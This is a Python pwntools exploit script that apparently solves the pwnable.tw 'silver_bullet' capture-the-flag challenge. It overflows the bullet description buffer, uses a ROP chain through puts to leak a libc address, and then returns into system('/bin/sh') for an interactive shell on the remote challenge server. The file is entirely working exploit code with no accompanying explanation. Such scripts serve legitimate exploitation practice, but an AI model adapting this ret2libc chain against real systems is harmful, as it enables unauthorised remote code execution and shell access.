#!/usr/bin/env python3
import time
from pwn import *

DELAY = 0.5
context.terminal = ["tmux", "splitw", "-h"]

libc = ELF("./libc_32.so.6")

r = remote("chall.pwnable.tw", 10103)
#r = process('./silver_bullet', env = {"LD_PRELOAD": "./libc_32.so.6"})
#gdb.attach(proc.pidof(r)[0])

def create_bullet(desc):
    print("create bullet", desc)
    r.sendafter("Your choice :", "1\x00")
    time.sleep(DELAY)
    r.sendafter("bullet :", desc)
    time.sleep(DELAY)

def power_up_bullet(desc):
    print("power up bullet", desc)
    r.sendafter("Your choice :", "2\x00")
    time.sleep(DELAY)
    r.sendafter("bullet :", desc)
    time.sleep(DELAY)

def beat():
    print("beat the wolf")
    r.sendafter("Your choice :", "3\x00")
    time.sleep(DELAY)

puts_plt = 0x80484a8
puts_got = 0x804afdc
pop_ebx = 0x08048475
main = 0x8048954
binsh = 0x158e8b

'''
section 1
'''
create_bullet('A' * (0x30 - 1))
power_up_bullet('B')

power_up_bullet(p32(0xffffffff)[1:] + b'A' * 4 + flat([puts_plt, pop_ebx, puts_got, main]))
beat() # trigger return

# read the remaining trash
r.recvuntil('!!\n')

# leak libc address
libc.address = u32(r.recvline()[:4]) - libc.symbols[b'puts']
print("libc address:", hex(libc.address))
print("system address:", hex(libc.symbols[b'system']))

'''
section 2
'''
create_bullet('A' * (0x30 - 1))
power_up_bullet('B')

power_up_bullet(p32(0xffffffff)[1:] + b'A' * 4 + flat([libc.symbols[b'system'], 0xABCDABCD, libc.address + binsh]))
beat() # trigger return

r.interactive()
